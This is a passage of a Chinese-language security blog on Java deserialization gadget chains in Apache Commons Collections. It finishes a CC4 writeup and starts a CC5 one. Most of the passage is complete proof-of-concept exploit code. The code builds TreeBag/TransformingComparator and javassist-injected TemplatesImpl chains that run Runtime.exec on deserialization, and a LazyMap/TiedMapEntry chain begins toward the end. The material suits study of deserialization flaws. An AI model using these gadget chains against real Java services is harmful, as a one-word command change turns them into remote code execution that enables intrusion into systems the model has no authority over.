class_">ChainedTransformer</span>(chainPart);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">treeBag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeBag</span>(comparator1);</span><br><span class="line">        treeBag.add(<span class="string">&quot;fupanc&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功按照预期弹了两个计算机。想法成立。</p>
<p>——————</p>
<p>OK，那么就通了，只要这里size为1就可以成使得<code>this.map.size()</code>返回1，这样序列化的时候就可以序列化<code>1</code>了，反序列化读取的时候也不是0了，从而成功可以进入for循环。</p>
<p>条件基本都说明了，直接上代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.bag.TreeBag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">treeBag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeBag</span>(comparator1);</span><br><span class="line">        treeBag.add(<span class="string">&quot;fupanc&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(chain,chainPart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(treeBag);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出预期的两个计算机</p>
<h3 id="javassist补充"><a href="#javassist补充" class="headerlink" title="javassist补充"></a>javassist补充</h3><p>那么同样的利用javassist也是可行的，就是注意一下前面说的需要关注compare的值：<br><img src="/2024/08/13/CC4/image-20240803195049751.png" alt="image-20240803195049751"></p>
<p>前面的理论过程懂了的话就基本没有问题了，就是下面的key需要为TemplatesImpl类实例：<br><img src="/2024/08/13/CC4/image-20240803195204033.png" alt="image-20240803195204033"></p>
<p>这里同样需要注意add()时弹出计算机的问题，直接在下面的POC一并解决了</p>
<p>可以构造如下POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.bag.TreeBag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">treeBag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeBag</span>(comparator1);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, code);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        treeBag.add(templates,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        outputStream.writeObject(treeBag);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>弹出两个计算机，还是算预期的，add一次，反序列化一次，和CC2那里是有区别的，调试了一下好像是在第一次成功调用transform后抛出异常，导致不能调用到第二个transform。</p>
<p>但是这里同样需要注意add时会调用一次，会先弹一次计算机，所以还是先假再反射更改来防止序列化前弹。</p>
<p>所以最终POC为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">fakeTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(fakeTransformer);</span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">treeBag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeBag</span>(comparator1);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, code);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        treeBag.add(templates,<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> TransformingComparator.class.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(comparator1,transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        outputStream.writeObject(treeBag);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出预期的一个计算机，但是不知道为啥这里能直接反射修改final修饰的transformer，正常应该是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> TransformingComparator.class.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field1, field1.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        field1.set(comparator1,transformer);</span><br></pre></td></tr></table></figure>



<p>OK，链子完结了。</p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java反序列化调用链分析</category>
        <category>CC4</category>
      </categories>
  </entry>
  <entry>
    <title>CC5</title>
    <url>/2024/08/13/CC5/</url>
    <content><![CDATA[<p>CC5学习</p>
<span id="more"></span>

<h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>在前面CC6的学习中，我们在找LazyMap.get()的其他调用链时，找到了<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>类，在CC6中，我们着重于调用TiedMapEntry类hashCode()方法从而可以调用到getValue()方法：</p>
<p><img src="/2024/08/13/CC5/image-20240731144552285.png" alt="image-20240731144552285"></p>
<p>但是纵观TiedMapEntry类的源码，还可以看到一个toString()方法：</p>
<p><img src="/2024/08/13/CC5/image-20240731144715109.png" alt="image-20240731144715109"></p>
<p>这个类也可以调用到TiedMapEntry类的getValue()方法，现在就是看是否还有哪个类可以调用到这个方法，也就是CC5要解决的问题。</p>
<p><strong>测试环境：</strong></p>
<ul>
<li>JDK 8u411</li>
<li>commons-collections 3.2.1</li>
</ul>
<h2 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h2><p>在ysoserial链中，我们可以看见新利用到了一个类，<code>BadAttributeValueExpException</code>，这个类位于<code>javax.management.BadAttributeValueExpException</code>，</p>
<p><strong>这里需要知道一个知识点</strong>：如果一个类没有实现<code>Serializable</code>接口，但只要某个类的祖先类（父类、祖父类等）实现了<code>Serializable</code>接口，那么其所有子类也被认为是可序列化的。</p>
<p><code>BadAttributeValueException</code>类源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>   &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">3105272988410493376L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>  &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;BadAttributeValueException: &quot;</span> + val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>虽然这个类没有实现Serializable接口，但是其父类Exception的父类Throwable实现了Serializable接口，所以BadAttributeValueException也是可以序列化的。</p>
<h3 id="个人思考"><a href="#个人思考" class="headerlink" title="个人思考"></a>个人思考</h3><p>现在继续来看源码，我看到了这个类的构造方法：<br><img src="/2024/08/13/CC5/image-20240731151507418.png" alt="image-20240731151507418"></p>
<p>这是一个三元操作符，如果val不为null，则返回<code>val.toString()</code>，既然这里是构造方法，我想到了CC3的利用方法，只要我们构造了val为我们设置好的<code>TiedMapEntry</code>类，那么我们是否能够成功调用。</p>
<p>在CC3利用到了InstantiateTransformer类，那么在这里再尝试利用一下。</p>
<p>想了一下，理论上应该是可以的，没得好大意义吗，因为最终在反序列化的时候还是需要调用其他类的readObject()，以CC3的HashMap为例，还是构建下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;ctf&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chainPart);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hash0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hash0,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy0,<span class="string">&quot;fupanc0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] realTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(BadAttributeValueExpException.class),<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;haha0&#125;)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(realTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hash1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hash1,outerMap);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 